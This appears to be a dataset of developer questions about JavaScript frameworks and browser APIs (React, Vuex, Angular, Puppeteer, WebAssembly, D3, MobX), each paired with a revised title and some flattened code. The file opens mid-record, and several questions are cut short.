|| `Cancel`; this.confirmText = element.getAttribute(""data-confirm"") || `Remove`; this.message = element.getAttribute(""data-message"") || `Do you want to delete the item?

React value won't pass non int characters," I have a React component that I am trying to implement so that it can pass the particular value of the list item that a user clicks to a handle method.

Am I unaware of a restriction that only allows integers to be passed through onClick methods? Or perhaps I configured the onClick method incorrectly.

How to console.log an error in node.js," I've been trying to debug my node app to find the source of an error in my log that shows up only as ""Error: Can't set headers after they are sent"", with no trace information or any context.As it happens, I think I've now fixed this... I am using connect-timeout and I was continuing processing a callback passed to an asynchronous network operation, which callback would eventually try to do a res.send(), despite req.timedout having been set to 'true' by connect-timeout during the network operation.BUT I still can't understand why my log wasn't showing trace information for this error. Anywhere that an error is returned in my code I log it to the console with: If there is trace information available in the err object, and this seems to be placed in err.stack, shouldn't the above statement dump the whole content of err (including err.stack) to the console log? My understanding is that I wouldn't be losing any information by doing the above, compared e.g. to: But posts like this one seem to suggest otherwise (though the linked post has now been updated).I actually go further, and add some relevant text to help locate the error: But despite this, I was still only getting ""Error: Can't set headers after they are sent"", without any of the context I'd put it. Would this be because this console error message is output within an external library (like express)? I thought that external libraries should send errors back to the main code to be dealt with accordingly?Edit: here's an example of where I put my error and timeout checking, at the top of the callback function passed to the async operation: I basically follow this same pattern throughout. <code>  console.log(err); console.log(err.stack); console.log('error in dodgyFunction:', err); var execFile = require('child_process').execFile;execFile('dodgycommand', options, function(error, stdout, stderr) { if (req.timedout) { console.log('timeout detected whilst running dodgycommand, so aborting...'); return; } if (error) { console.log('error running dodgycommand:', error); res.sendStatus(400); return; } // ... it's safe to continue ...}",How to console.log an error with stack trace in node.js?

Benchmarking web crypto is much slower than third-party libraries?," I am evaluating how WebCrypto performance compares to third-party crypto libraries SJCL and Forge. I would expect WebCrypto to be much faster since it is a native browser implementation.

"Angular 2 sub apps, nested components, design/coding"," I have an Angular 2 app. The main screen (app?) looks like this...When you click items in the top menu routerLinks, new Components load into the main view router outlet. One of those links loads up an new ""Admin"" Module/Component with it's own routes and new router outlet... Then when you click the routerLinks in the left nav, new admin Components will load in the new router outlet.But...Angular 2 does not allow more than 1 router outlet. So clicking on any routerLink in left nav simply replaces the entire inital router outlet view.I've seen some SO posts (older, maybe deprecated) on using ""bootstrap"" to load subsequent Components, but I can't get that to work. I can't even import { bootstrap } from 'anywhere at all, nothing works'. So maybe that's not the way to do this.How can I get the Admin sub app part to work?Thank you very, very much for sharing your Angular 2 expertise :-)EDIT: Trying suggested solutions below. No matter where I put the routes, in the base app.routes.ts or in the sub-app admin.routes.ts, no matter how I format the routerLinks, I keep getting this error...EDIT AGAIN: Here is the code in the routers and the template... EDIT 3: Tried changing RouterModule.forRoot to RouterModule.forChild, sadly, same error :-/ EDIT 4: Converted routing to use 2 routing modules. Was hoping maybe that would make a difference, but same error.New routers... EDIT 5: IT'S WORKING!Removed the routing modules, returned to exporting routes config per Tyler's suggestion. He is right, the routing modules do not work. Tyler worked with me a lot so I'm accepting his answer. Thank you Tyler for your help! Here is how you can setup a parent app with it's own router-outlet, then on the parent click a link to load up a child app with it's own new router-outlet. The child app loads/replaces the parent app router-outlet.There is really nothing special in the parent app module or routes. They're just how I had them before this post.The important points to note, at least in my case today, do not use a name="""" attrib in the child router-outlet. This will cause ""Error: Cannot match any routes..."". Do not use routing modules like I tried above, this also causes ""Error: Cannot match any routes..."". Do not use outlet: 'blah' in the routes, this also causes ""Error: Cannot match any routes..."". Make sure you set up the child route config children: [] exactly as you see below in admin.routes.ts. Also, note the RouterModule.forChild(router) in the child routes. These things fixed the issue for me today.

Best way to polyfill in my create-react-app project," I've been testing my React.js application on internet explorer, and finding that some ES6/7 code like Array.prototype.includes() breaks it. I'm using create-react-app, and apparently they've chosen not to include a lot of polyfills since not everyone needs them, and they slow down build times (see for example here and here). The documentation (at time of writing) suggests: If you use any other ES6+ features that need runtime support (such as Array.from() or Symbol), make sure you are including the appropriate polyfills manually, or that the browsers you are targeting already support them.So... what is the best way to 'manually' include them?  <code> ",Best way to polyfill ES6 features in React app that uses create-react-app

Javascript - is there a way that I can set a global while/for loop timeout?," I am writing an in-browser code editor for games. The editor will allow users to write their own JavaScript files, which are then loaded into the same DOM that the editor is running on. This will allow them to see the game in a canvas element next to the code and update it every time they save.The editor is aimed at people who are new to JavaSript, and it can be easy to accidentally get an infinite loop. If possible, I want to set up my editor such that if a loop executes too many times or too fast, the loop is broken and a message pops up alerting the user that they have an infinite loop.This would be ideal for people who are new, because if the entire editor just crashed suddenly, they may not realize what their mistake was and think it was an issue with my editor.How can I implement fail-safes in my editor which stop infinite loops automatically? <code> ",How to detect and stop an infinite loop in user-provided JavaScript code?
Add a Title tag to elements with text-overflow: ellipsis," I am not sure if this is easily possible, but I thought I would ask just in case:I am using the following CSS rules on a list of text: As expected, any text that goes outside the list will be truncated and have an ellipsis placed on the end.I want to have an active title property for only those list items that trigger the text-overflow rule on the list. So you can hover the mouse over any text that is truncated and see a tooltip of its full text.Something tells me this is difficult, if not impossible, to do. However I would love to be proven wrong.

"is Function() constructor no optimized by V8, like eval?"," We are trying a way to receive web components via WebSockets. Those components contains custom scripts and they should be run in a context inside the component.In short, we have some script strings and want to run them.Right now we are using eval for this, something like this: and works as expected, but I'm reading that any function containing eval is not optimized by V8. I thought into converting it to new Function() like this: this way I can achieve the same as the ctxEval function above.We know that Function is eval() because they act almost equally, but the question now is, until which point Function is eval()? Maybe because Function() has its own scope instead of the eval one which runs the code in the same scope, the function containing the Function call is actually optimized by V8. Also, here they talk about eval but not about Function constructor.And another question implied in this one is, is the script that runs inside Function() optimized by V8? <code>  function ctxEval(ctx, __script) { eval(__script); // return things with the ctx} new Function(""ctx"", __script)(ctx);","Is the Function() constructor not optimized by V8, like eval?"
Actual race condition in JavaScript with assignment operator?," I'm not talking about complex race conditions involving the network or events. Rather, I seem to have found out that the += operator is not atomic in V8 (Chrome 58, or Node 8).The code below aims to run two so-called threads in parallel. Each ""thread"" calls repeatedly a function that returns its number parameter after sleeping that many seconds. The results are summed up into an accumulator. The problem is that after ~5 seconds, I'd expect the accumulator to be 10.3 (5 times 1 + 1 times 5.3). However, it's 5.3! <code>  function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms));}// Return the passed number after sleeping that many secondsasync function n(c) { await sleep(c * 1000); console.log('End', c); return c;}let acc = 0; // global// Call n repeatedly and sum up resultsasync function nForever(c) { while (1) { console.log('Calling', c); acc += await n(c); // += not atomic?! console.log('Acc', acc); }}(async function() { // parallel repeated calls nForever(1); nForever(5.3); // .3 for sanity, to avoid overlap with 1 * 5})();",Race condition in JavaScript with compound assignment

vuex updating items in an array opdates them all," I'm working on an application using vuejs with vuex which uses projects, with each project having one or more jobs. I can add, delete and update the jobs. The adding and deleting is working perfect, but the updating is not.The state in the vuex dev tools:My HTML: As you can see, I have a v-for that is showing all my jobs. When editing a value inside my jobs, I use the @change event to update my value. And, at the bottom, I have two buttons to add and remove a job row.My stores are divided into modules. The main store looks like this: The module store for this specific problem: The project state is mapped to a computed property of my vue instance: The problem is the following: In the image of the application, you can see that I entered ""vin"" in one of the fields, but all of the fields are updating.So, all of the function fields of all the jobs have been updated to my last entry, instead of only the one I want.What am I doing wrong?PS:I also tried the following in my mutation function: But it's giving me the same result.UPDATE: As requested, I created a jsFiddle to show my problem <code>  <div class=""job-compact row"" v-for=""(job, index) in project.jobs""> <div class=""col-md-6""> <div class=""form-group"" :class=""{'has-error' : errors.has('jobs.' + index + '.function')}""> <input type=""text"" name=""jobs[function][]"" class=""form-control"" v-model=""job.function"" @change=""updateJobValue(index, 'function', $event.target.value)""/> </div> </div> <div class=""col-md-4""> <div class=""form-group"" :class=""{'has-error' : errors.has('jobs.' + index + '.profiles')}""> <input type=""number"" name=""jobs[profiles][]"" class=""form-control"" v-model=""job.profiles"" @change=""updateJobValue(index, 'profiles', $event.target.value)""/> </div> </div> <div class=""col-md-2""> <button v-if=""index == 0"" class=""btn btn-success btn-sm"" @click=""addJob""><i class=""fa fa-plus""></i></button> <button v-if=""index > 0"" class=""btn btn-danger btn-sm"" @click=""deleteJob(index);""><i class=""fa fa-minus""></i></button> </div> </div> import Vue from 'vue'import Vuex from 'vuex'Vue.use(Vuex);const state = {};const getters = {};const mutations = {};const actions = {};//Separate Module Statesimport jobCreator from './modules/job-creator/store';export default new Vuex.Store({ modules: { jobCreator: jobCreator }, state, actions, mutations, getters}); import store from './../../store'const state = { project: { title: null, description: null, jobs: [] }, defaultJob: { function: '', title: '', description: '', profiles: 1, location_id: '', category_id: '', budget: '', },};const getters = {}const mutations = { addJob(state, job) { state.project.jobs.push(job); }, deleteJob(state, index) { state.project.jobs.splice(index, 1); }, updateJobValue(state, params) { Object.assign(state.project.jobs[params.jobIndex], { [params.field]: params.value }); }};const actions = { addJob: function (context) { context.commit('addJob', state.defaultJob); }, deleteJob: function (context, index) { context.commit('deleteJob', index); }, updateJobValue: function (context, params) { context.commit('updateJobValue', params); },};const module = { state, getters, mutations, actions};export default module; computed: { ...mapState({ project: state => state.jobCreator.project, }),} updateJobValue(state, params) { var job = state.project.jobs[params.jobIndex]; job[params.field] = params.value; Vue.set(state.project.jobs, params.jobIndex, job);}",Updating an item in an array updates them all
React Native Fetch: Does not render response until after clicking screen (Solved)," So I've been building an app that uses the Fetch API to make a request. Unfortunately, I think the code shown in the Facebook docs are (may be?) incorrect.ProblemWhen starting the app, Fetch makes a call to a URL to pull JSON data. This is similar to the code that Facebook docs give as an example.The problem is that when I start the app, the data doesn't render in the render function. At least, it doesn't render until after I click/touch the screen. Once I touch the screen, the data renders. Otherwise, it just stays in a perpetual ""loading"" state.Solution?I remembered that sometime in the past, I had to bind event handlers to their respective controls (this.handleClick = this.handleClick.bind(this), for example)And that got me thinking: Where is this in the promise request? Where does this point to? I console.logged ""this"" within the responseJson promise, and it does point to the component, but I'm not convinced. With it being buried inside of the promise, I don't think the this.setState function is actually able to set the component's State.So I made a variable before the fetch request. Now I'm not a software guru. I've been teaching myself this stuff for the last couple of years, so my logic is off half the time. So if my reasoning is correct or incorrect, please let me know! What I do know is that this is working for me; once the data is fetched, it automatically sets the state and reloads, showing me the JSON data when rendered. Any thoughts? Am I completely off here? Am I missing anything? <code>  componentDidMount(){ return fetch(REQUEST_URL) .then((response) => response.json()) .then((responseJson) => { this.setState({ isLoading: false, data: JSON.stringify(responseJson) }) }) .catch((error) => { console.error(error); });} render() { if (this.state.isLoading) { return ( <View style={{flex: 1, paddingTop: 20}}> <ActivityIndicator /> </View> ); } var data = this.state.data;return this.renderData(data); } componentDidMount(){ return fetch(REQUEST_URL) .then((response) => response.json()) .then((responseJson) => { this.setState({ <--- **Where are you going?** isLoading: false, data: JSON.stringify(responseJson) }) }) const that = this;return fetch(REQUEST_URL).then((response) => response.json()).then((responseJson) => { that.setState({ isLoading: false, data: JSON.stringify(responseJson) })})",React Native Fetch does not render response until after clicking screen

"document.execCommand('copy') works only for the first time, document.queryCommandEnabled(""copy"") is false afterwards"," Writing a tiny browser extension in Chrome to copy some specific text from specific web pages to the clipboard. In HTML format, so people could paste it to office programs like word, outlook etc.document.execCommand('copy') is the command I use, it is being triggered by an document.onkeydown key combination (Alt+1), and it works fine - but only for the first time.

But I just get the body request as in json format.Futhermore, why I have to put a ? symbol at the end of some name of fields ?

Trouble with ES6 Modules," Solved: Fixing the MIME types of my server fixed the problem. I had forgotten that I messed with them myself some time ago.

Sadly I can't get anything module related to execute, even tho the live-demo works just fine.

Solved: Trouble with ES6 Modules," Solved: Fixing the MIME types of my server fixed the problem. I had forgotten that I messed with them myself some time ago. Special Thanks to @Sidney, @estus and @Josh Lee for helping me out.Once I found a working live-demo referenced on the MDN of ES6 Modules that just works in my current version of Chrome, I wanted to try to experiment with modules.

three.js: really strange behaviour with camera changes," I have developed a simple three.js application that renders a cube, and which have several buttons to set fixed camera positions. I have a demo of my code here: https://jsfiddle.net/ph0ropg7/9/In my application I render a cube, and I can change to the top view (with the TOP VIEW button), and I can adjust the cube to the screen with the SHOW ALL button. However, I noticed three strange things:When I pan the cube and then I rotate it, if I press the SHOW ALL button, the camera orientation changes when the cube is adjusted to the screen size.When I set the top view with its corresponding button, the controls seems to be blocked or something like this.If I set the top view by clicking on the TOP VIEW button, and dragging before releasing the mouse left button, the controls seems to become crazy. The objects keeps vibrating in a very strange and annoying way.I am very new to three.js and I cannot figure out why this three things are happening. Any help or suggestion to face any of these issues will be appreciated, thanks. <code> ",three.js - really strange behaviour with camera changes

Pitfalls with using scientific notation is JavaScript," This question is not seeking developer code formatting opinions. Personally, I prefer to use scientific notation in my JS code when I can because I believe it is more readable. For me, 6e8 is more readable than 600000000. That being said, I am solely looking for potential risks and disadvantages specifying numbers in scientific notation in JS. I don't see it often in the wild and was wondering if there is technical reasoning for that or if it simply because of developer's druthers. <code> ",Pitfalls with using scientific notation in JavaScript

The doc says: If you are using the Modules mode of the Vuex store, only the primary module (in store/index.js) will receive this action.

d3 zoom with touch devices sometimes behaves weirdly," I have a d3 & Ionic project that can be found on github here. I didn't create a Plunkr, because the bug must be reproduced via the android emulator or android device.I have a graph that pans and zooms. I'm attempting to keep about 60 data points in the graph at a time. When the user reaches the ""edge"" meaning that the distance between the domain and the data points is about 2 then I refresh the data appending and removing data based upon the new domain. Before the async call it seems like zoom gets messed up and panning causes the zoom to act as if i'm pinching. This happens when the graph is being redrawn while panning.

RSA Encrypt/Decrypt with Angular 2+," I'm using Angular 4 to make the front end of my application. I have implemented OAuth2 on my backend (developed with Spring in Java), so people using my application must be authenticated.The thing is that we can see clearly the passwords from the backend server logs and it could be caught by a MITM until I add a SSL.That's why I decided to encrypt the sent password with RSA. My backend is already ready, but I don't find any up-to-date libraries that provide a decent API for encrypt/decrypt from a RSA key-pair.Also seen crypto module, but no longer usable on ECMAS6. The crypto-js one only provides AES and some hashing such as MD5/SHA. <code> ",RSA Encrypt/Decrypt in TypeScript

Create Seamless Loop HTML5," I want to create a seamless loop of an audio file. But in all approaches I used so far, there was a noticeable gap between end & start.This is what I tried so far:First approach was to use the audio in the HTML and it loops but there is still a noticeable delay when going from the end of the track to the beginning. Then I tried it from JavaScript with the same result: After that I tried this (according to this answer) I played around with the buffer but I only got it to reduce the gap but not leave it out entirely.I turned to the library SeamlessLoop (GitHub) and got it to work to loop seamlessly in Chromium browsers (but not in the latest Safari. Didn't test in other browsers). Code I used for that: EDIT: I tried another approach: Looping it trough two different audio elements: But as milliseconds in browsers are not consistent or granular enough this doesn't work too well but it does work much better than the normal ""loop"" property of the audio.Can anyone guide me into the right direction to loop the audio seamlessly? <code>  <audio loop autoplay> <source src=""audio.mp3"" type=""audio/mpeg""><audio> let myAudio = new Audio(file);myAudio.loop = true; myAudio.play(); myAudio.addEventListener( 'timeupdate', function() { var buffer = .44; if (this.currentTime > this.duration - buffer) { this.currentTime = 0; this.play(); } }, false); let loop = new SeamlessLoop();// My File is 58 Seconds long.

JavaScript array.foreach() not working in recent Microsoft browsers," I am making a script for choices about a product (colors etc), which works in every browser except for Internet Explorer (11) & Edge.I put the choices of each parameter in a array and apply a function to them with the array.forEach() method.Example for the color parameter: I get the following output in the console of both IE & Edge: Object doesn't support property or method 'forEach'After searching about the issue, I learnt that this function should be supported by IE 9 and newer. I tried to define the function by myself without success. When I log the function it is defined as a function (with ""[native code]"" inside).I replaced every .forEach by a for and it's working pretty well,but how can I make it work ?Is there a specific usage of the forEach() for Internet Explorer & Edge ?I thought it was Array.prototype.forEach and that recent versions of IE (and all versions of Edge) had it...? <code>  var color_btns = document.querySelectorAll('#color > p');color_btns.forEach(function(color) { color.onclick = function () { color_btns.forEach(function(element) { if (element.classList.contains('selected')) { element.classList.remove('selected'); } }); color.classList.add('selected'); document.querySelector('#f_color').value = color.dataset.id; };});",forEach on querySelectorAll not working in recent Microsoft browsers

javascript: working with promises inside an if/else," I have a conditional statement in which I need to perform one of two operations, then continue after whichever operation has resolved. So my code currently looks as follows: The issue is that both do_thing_a and do_thing_b return promises, and I can't move on until whichever gets executed has resolved. The best way I've come up with to solve this is like this: I don't like this structure. It's difficult to follow because you need to jump around to find where more_code is defined (imagine I have this type of control flow in several locations), rather than simply being able to continue reading.Is there a better way to deal with this type of thing in javascript? <code>  if (shoud_do_thing_a) { //should_do_thing_a is just a variable that determines which function to call. it is not a promise do_thing_a()} else { do_thing_b()}// more code var more_code = function () { // more code}if (shoud_do_thing_a) { do_thing_a().then(more_code)} else { do_thing_b().then(more_code)}",Working with promises inside an if/else

Or would this require having to write a custom method that would involve other string manipulation in order to accomplish this? <code>  ""ABCDEFG"" var foo = ""ABCDEFG"";foo.match(/.{1,3}/g); // Array(3) [""ABC"", ""DEF"", ""G""] // Array(3) [""A"", ""BCD"", ""EFG""] foo.match(/.{-1,3}/g); // nullfoo.match(/.{1,-3}/g); // null",Javascript .match regular expression with reverse quantifier (or parse right to left)
Exclude a value for a path parameter in Route," I'm a bit stuck with the route component.

Route with old data when navigates in Angular," I'm using angular 5.1.0, and I have an issue with the routing system, let me explain:In my app-routing module I have an url /api that lazy loads another module, in that lazy loaded module I have the next routing implementation:api-routing.module.ts The important thing here is the data param that the Router receives. In my app I have a generic error behaviour that when an exception is throwed I have a errorHandler class that catch the error and redirects to another url: /error, this is the handler code: The problem is, when an exception is throwed inside /api and handleError is executed, I see my generic error page rendered with the breadcrumb loaded in the last route: /api by data param.Is there any way to set the Router to reset data when is loaded? or maybe I'm doing something wrong?UPDATEAt this point I thought the problem was due to data param, but now I see that it's not the problem. Let me show my error.component that is rendered when Router loads /error: I have included in the onInit component method, a trace of ActivatedRoute snapshot to see what it has, and the thing is that trace is not showing when errorHandler navigates from /api to /error.But if I load directly /error the trace is showed, so for any reason the error component is not instanciated correctly in the first scenario (navigate from /api to /error)UPDATEI have upgraded to angular 5.2.9 and the problem still happens. <code>  const routes: Routes = [ { path: '', component: ApisComponent, data: { breadcrumbs: 'APIs', }, children: [ { path: '', component: ApiListComponent, }, { path: ':id', component: ApiDetailComponent, resolve: { api: ApiResolverService }, data: { breadcrumbs: '{{ api.title }}', }, }, ], },]; import { ErrorHandler, Injectable, Injector } from '@angular/core';import { Router } from '@angular/router';@Injectable()export class AppErrorHandler implements ErrorHandler { constructor(private injector: Injector) { } handleError(error: any): void { const routerService = this.injector.get(Router); routerService.navigateByUrl('/error', { skipLocationChange: true }); }} import { Component, OnInit } from '@angular/core';import { Router, ActivatedRoute } from '@angular/router';@Component({ selector: 'app-error', templateUrl: './error.component.html', styleUrls: ['./error.component.scss']})export class ErrorComponent implements OnInit { constructor(private router: Router, private route: ActivatedRoute) { } ngOnInit() { console.log('snapshot trace'); console.log(this.route.snapshot); }}",Routing child to parent is not working when navigates in Angular

React - ternary operator with state as condition," I'm working on a webapp where the user views a list of items and can mark certain items as favourites. The favourites are provided as an array of ID's with a prop (this.props.favourites). To prevent duplicate entries I want to replace the 'add to favourites' button with a 'delete from favourites' button if the item.id is already in the this.props.favourites array. However, the ternary If statement I've made crashes on a syntax error. Yet I thought I followed the official example (https://reactjs.org/docs/conditional-rendering.html) pretty closely. This is the code that I used: Does anyone have an idea what I am doing wrong? <code>  render() { const items = this.state.items.map((item, index) => ( <p key={index}> {item.name} </p> {(this.props.favourites.include(item) ? ( <button>add fvourites</button> ) : ( <button>delete</button> )} )); return ( <div> <button onClick={this.LoadApi}>Show fetch Items</button> <div>{items}</div> </div> ); }}",ternary operator inside map

dynamically instantiate an ng-template and create HTML," I am trying to build a typeahead.js component for use in Angular 5.I have a working plunker, as far as I can get it working.When the component, type-head is declared, an ng-template is supplied to the component. Each hint should display name: sam|frodo|pippin etc.The type-head component is declared as follows: When the typeahead.js component needs to display a hint, it executes a callback, the suggest method which should return HTML content.At the moment my implementation is as follows: I want to replace this implementation with an implementation that uses the ng-template. I can render the template using *ngTemplateOutlet, but I don't know how to do it dynamically so I can return the HTML. My question is: How do I load up the #hint ng-template, bind the value to it, and return the rendered HTML to typeahead.js in my suggest function. <code>  <type-head> <ng-template #hint let-hint=""hint"">name: {{hint.name}}</ng-template></type-head> @Component({ selector: 'type-head', template: ` <input #input class=""form-control"" /> <ng-content #content></ng-content> `}) /** * TODO: REPLACE THIS FUNCTION WITH A DYNAMIC TEMPLATE */suggest(value:any) { return $(""<div>name: "" + value.name + ""</div>"");}",dynamically instantiate an ng-template and create HTML in angular 5
React + D3 force layout - How to make the graph draggable?," I've been trying to make a draggable d3 force layout in React for a while now. React has to be able to interact with the nodes in the graph. For example, when you click on a node, React should be able to return the node's id onClick.I made 4 components according to one of Shirley Wu's examples. An App component that holds the graph data in it's state and renders the Graph component. The graph component renders a Node and a Link component. This way, the clickable nodes part worked out.When the page renders, the nodes will be draggable only for a few seconds though. Immediately after rendering the page you can drag nodes, then suddenly, the node being dragged stops in one position completely. At this point the other nodes cannot be dragged anymore either. I expected to be able to drag the nodes at all times.I could find a few hints online about creating a canvas behind the graph, setting fill and pointer-events. There are also many discussions about letting or d3 or React do the rendering and calculations.

how does comma operator work in js," I'm trying to understand how the comma operator (,) works in JavaScript,it seems to have a different behaviour when it's not put between parenthesis.

My question is about a misconception between the coma operator and var attribution as somone explained further downTherefore this subject is not a duplicate of that one What does a comma do in JavaScript expressions? <code>  var a = 1; var b = 2; var c = (a,b);console.log(c);//output : as expected var c = a,b;console.log(c);//output : 1 ",How does the comma operator work in js?

How to give GraphQL a schema to Gatsby," We're bringing in some posts from a Wordpress backend, some have pictures (in an ACF field) and some don't. The problem is that Gatsby infers the schema based off of the first node it receives. If it receives a node without a picture, then the schema is wrong. Where does Gatsbys GraphQL schema come from? With Gatsby, we use plugins which fetch data from different sources. We then use that data to automatically infer a GraphQL schema.How can we dictate a schema to GraphQL/Gatsby that always includes a picture, with 'null' as the default value if it's blank? In the example above, sometimes 'photo' doesn't exist and it breaks everything...Gatsby config: <code>  { allWordpressWpTestimonial { edges { node { id title acf { photo_fields { photo { id localFile { childImageSharp { sizes { src } } } } } } } } }} const innertext = require('innertext')const url = require('url')module.exports = { siteMetadata: { title: 'Test', googleMapsAPIKey: 'xxxxxx', adminBaseUrl: '123.123.123', adminProtocol: 'http', }, pathPrefix: '/web/beta', plugins: [ 'gatsby-plugin-react-next', 'gatsby-plugin-react-helmet', 'gatsby-plugin-sharp', 'gatsby-plugin-svgr', { resolve: 'gatsby-plugin-google-analytics', options: { trackingId: 'GOOGLE_ANALYTICS_TRACKING_ID', }, }, { resolve: 'gatsby-plugin-bugherd', options: { key: 'xxxxxx', showInProduction: true, }, }, { resolve: '@andrew-codes/gatsby-plugin-elasticlunr-search', options: { fields: ['title', 'url', 'textContent', 'urlSearchable'], resolvers: { wordpress__PAGE: { title: node => node.title, textContent: node => innertext(node.content), url: node => url.parse(node.link).path, urlSearchable: node => url .parse(node.link) .path.split('/') .join(' '), }, wordpress__POST: { title: node => node.title, textContent: node => innertext(node.content), url: node => `/news/${node.slug}`, urlSearchable: node => url .parse(node.link) .path.split('/') .join(' '), }, wordpress__wp_industry: { title: node => node.title, textContent: node => innertext(node.content), url: node => `/business/industries/${node.slug}`, urlSearchable: node => url .parse(node.link) .path.split('/') .join(' '), }, }, }, }, { resolve: 'gatsby-source-wordpress', options: { baseUrl: 'xxxxxx', protocol: 'http', hostingWPCOM: false, useACF: true, auth: { htaccess_user: 'admin', htaccess_pass: 'xxxxxx', htaccess_sendImmediately: false, }, verboseOutput: false, }, }, 'gatsby-transformer-sharp', ],}",How to give Gatsby a GraphQL schema

Can I make selenium pause for input and resume on a button press?," I am wondering if selenium can do below? I want to automate only certain parts of the automation flow:Load a web page (built with angular), submit the form with somepredefined inputs On the next page, automatically fill in somedata like earlier, but wait for me to fill in some input on specificinput fields (can't hard-code this data)After this, a trigger (like a buttonpress or key combination; outside of the web page) should carry on with the rest of the automated flow and landin page 3 and 4 and so on.The only option I am familiar with is to write and run custom JS that modifies form elements, in the browser>inspect>console. For above, I'll have to run different functions on each page. For doing this, I can comment out all but the required function call and run it. I think I cannot select and run only one part of the code (for page 1 for example) from the console.PS: If any of the strict SO folks think this is not fitting SO, where else is a good (automation focused?) place to ask for finding the right tools for this kind of stuff? <code> ",Can I make selenium pause for input and resume on a trigger?

How to make MobX update the component when observable is referenced outside render method?," After switching from Redux to MobX for React I'm starting to extremely like MobX. It's pretty awesome.MobX has a certain behavior where it won't update component if the provided store observable is not used in render. I think generally that's a pretty great behavior that makes components render only when something actually changed.But... I do encountered couple of cases where I do not want or need to use MobX observable inside render method and in such cases my this.props.store with MobX store won't get updated. And in such cases, as a workaround, I just reference the observable in the render method, but I don't think that's a very clean approach, and I'm wondering if there's a cleaner way to do that?This component code should explain even more what I'm exactly asking about.It's a component that changes body overflow style based on a MobX observable that I have in my store. (Note: I don't use @decorators, I connect store using ES5 syntax in the connectStore function. And it would be awesome if solution to this would be also in ES5.) <code>  /*------------------------------------*\ Imports\*------------------------------------*/import React from 'react';import connectStore from 'script/connect-store';import addClass from 'dom-helpers/class/addClass';import removeClass from 'dom-helpers/class/removeClass';/*------------------------------------*\ Component\*------------------------------------*/class Component extends React.Component { constructor(props) { super(props); this.constructor.displayName = 'BodyClassSync'; } componentDidMount() { this.checkAndUpdateMuiClass(); } componentDidUpdate() { this.checkAndUpdateMuiClass(); } checkAndUpdateMuiClass() { // This place is the only place I need latest MobX store... if (this.props.store.muiOverlay) { addClass(window.document.body, 'mod-mui-overlay'); } else { removeClass(window.document.body, 'mod-mui-overlay'); } } render() { // This is my workaround so the componentDidUpdate will actually fire // (with latest and updated store) // when the 'muiOverlay' observable changes in the MobX store // Is there any cleaner/better way to do this? this.props.store.muiOverlay; // This component doesn't and shouldn't render anything return null; }}/*------------------------------------*\ Export\*------------------------------------*/const ComponentWithStore = connectStore(Component);export default ComponentWithStore;",How to make MobX update the component when observable is not used in the render method?

Higher order function outputs pure function," Here's an example of an higher order function called functionA that has customValue as input and returns a function that gets an input and uses the custom value to elaborate a result: Here's some results: Can the function returned by functionA be considered pure?UPDATE: the examples above are only using numeric input. As described by @CRice, the returned function can be considered pure only when customValue is constant and doesn't have internal state (like classes). <code>  let functionA = (customValue) => { let value = customValue || 1; return input => input * value;}; functionA()(4) // => returns 4functionA(2)(4)// => returns 8functionA(3)(4)// => returns 12functionA(4)(4)// => returns 16",Higher order function returns pure function

proper way to use page.waitForNavigation in puppeteer," I'm a bit confused about page.waitForNavigation. I know what it is and what it does but I get different results based on the interenet speed (that's what I think is the factor).Imagine this code: It fills the login form, submits the login form, waits for the form to be submited and then redirects to dashboard.This works fine on my localhost which has slower internet speed (compared to the server), but when I upload it to the server, I get On the server it works fine if I remove await page.waitForNavigation(); from the code and I get redirected to dashboard.But now on localhost, I get redirected to the dashboard before the form can be submitted. I get you cant see dashboard , your not logged in or something like this.I think the deciding factor is the speed of internet.On the server, I have a very high speed so the form gets instantly submitted and it's done before the await page.waitForNavigation() line so I get a nvigation timeout error.But on the localhost with the slower speed, the form needs more time to be submitted so I need to have await page.waitForNavigation() after submitting the form, otherwise I get redirected to the dashboard before the form has any chance to be submitted.I'm looking for advice from someone with more experience working with Puppeteer on how to handle this kind of situation. Right now, I keep editing my code when running on server or localhost, which works, but it's very annoying!After using I get <code>  await page.$eval('#username', (el , setting ) => el.value = setting.username , setting );await page.$eval('#password', (el , setting ) => el.value = setting.password , setting );await page.$eval('form', form => form.submit());await page.waitForNavigation();await page.goto( 'http://example.com/dashboard' ); Error: Navigation Timeout Exceeded: 30000ms exceeded async function open_tab(setting) { const page = await global_browser.newPage(); await page.setViewport({ width: 1000, height: 768 }); return await new Promise(async(resolve, reject) => { await page.$eval('#username', (el, setting) => el.value = setting.username, setting); await page.$eval('#password', (el, setting) => el.value = setting.password, setting); await Promise.all( page.$eval('form', form => form.submit()), page.waitForNavigation() ) await page.goto('http://example.com/dashboard'); resolve(); }).then(() => { console.log(' -> don!

And yes, the input is again tested on the server side.So, let's say I invalidate the field: Do I still need to add aria-invalid=""true"" to the input?I'd say no, because it is redundant to what the engine already knows.

"What is type of ""require"" function return value in JavaScript?"," I'm writing a project based on react native.

WebAssembly: Working with memory to fetch string yields incorrect result," I am following the solutions from here:How can I return a JavaScript string from a WebAssembly functionand here:How to return a string (or similar) from Rust in WebAssembly?However, when reading from memory I am not getting the desired results.AssemblyScript file, helloWorldModule.ts: index.html: This returns an offset of 32. And finally yields a string that starts too early and has spaces between each letter of ""Hello World"":However, if I change the array to an Int16Array, and add 8 to the offset (which was 32), to make an offset of 40. Like so: Then we get the correct result:Why does the first set of code not work like its supposed to in the links I provided? Why do I need to change it to work with Int16Array to get rid of the space between ""H"" and ""e"" for example? Why do I need to add 8 bytes to the offset?In summary, what on earth is going on here? Edit: Another clue, is if I use a TextDecoder on the UInt8 array, decoding as UTF-16 looks more correct than decoding as UTF-8: <code>  export function getMessageLocation(): string { return ""Hello World""; } <script> fetch(""helloWorldModule.wasm"").then(response => response.arrayBuffer() ).then(bytes => WebAssembly.instantiate(bytes, {imports: {}}) ).then(results => { var linearMemory = results.instance.exports.memory; var offset = results.instance.exports.getMessageLocation(); var stringBuffer = new Uint8Array(linearMemory.buffer, offset, 11); let str = ''; for (let i=0; i<stringBuffer.length; i++) { str += String.fromCharCode(stringBuffer[i]); } debugger; }); </script> <script> fetch(""helloWorldModule.wasm"").then(response => response.arrayBuffer() ).then(bytes => WebAssembly.instantiate(bytes, {imports: {}}) ).then(results => { var linearMemory = results.instance.exports.memory; var offset = results.instance.exports.getMessageLocation(); var stringBuffer = new Int16Array(linearMemory.buffer, offset+8, 11); let str = ''; for (let i=0; i<stringBuffer.length; i++) { str += String.fromCharCode(stringBuffer[i]); } debugger; }); </script>",Working with memory to fetch string yields incorrect result

